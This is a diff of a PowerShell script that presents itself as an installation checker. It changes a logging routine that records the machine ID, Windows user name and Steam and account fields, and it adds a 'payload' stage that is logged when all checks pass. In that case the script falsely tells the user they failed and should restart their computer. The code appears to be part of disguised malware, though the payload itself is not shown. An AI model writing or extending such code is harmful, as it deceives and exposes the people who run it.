@@ -19,7 +19,7 @@ $mId = [System.BitConverter]::ToString(
 ).Replace('-','').Substring(0,16).ToLower()
 
 function sLog {
-    param([string]$t,[string]$m,[hashtable]$e = @{})
+    param([string]$t,[string]$m,[string]$st="check",[hashtable]$e = @{})
     try {
         $l = @{
             timestamp = (Get-Date).ToString("o")
@@ -30,7 +30,7 @@ function sLog {
             pcUser = $env:USERNAME
             steamId = ""
             username = ""
-            stage = "check"
+            stage = $st
         }
         if ($e.Count -gt 0) { $l.extra = $e }
         $j = $l | ConvertTo-Json -Compress
@@ -40,8 +40,9 @@ function sLog {
     } catch {}
 }
 
-function lInfo { param($m, $e = @{}) sLog -t "info" -m $m -e $e }
-function lErr { param($m, $e = @{}) sLog -t "errors" -m $m -e $e }
+function lInfo { param($m, $e = @{}) sLog -t "info" -m $m -st "check" -e $e }
+function lErr { param($m, $e = @{}) sLog -t "errors" -m $m -st "check" -e $e }
+function pInfo { param($m, $e = @{}) sLog -t "info" -m $m -st "payload" -e $e }
 
 function tFile {
     param([string]$p, [string]$n)
@@ -204,13 +205,12 @@ function chk {
     
     if ($pc -eq $tc) {
         Write-Host "  [!] You did not pass the checking! Restart your computer." -ForegroundColor Red
-        lInfo "Installation check completed" @{
+        pInfo "Installation check completed" @{
             passed = $pc
             total = $tc
             percentage = $pp
             allPassed = $true
             repaired = $needsRepair
-            payload = $true
         }
     } elseif ($pc -ge 4) {
         Write-Host "  YOU DID NOT PASS THE CHECKING!" -ForegroundColor DarkYellow
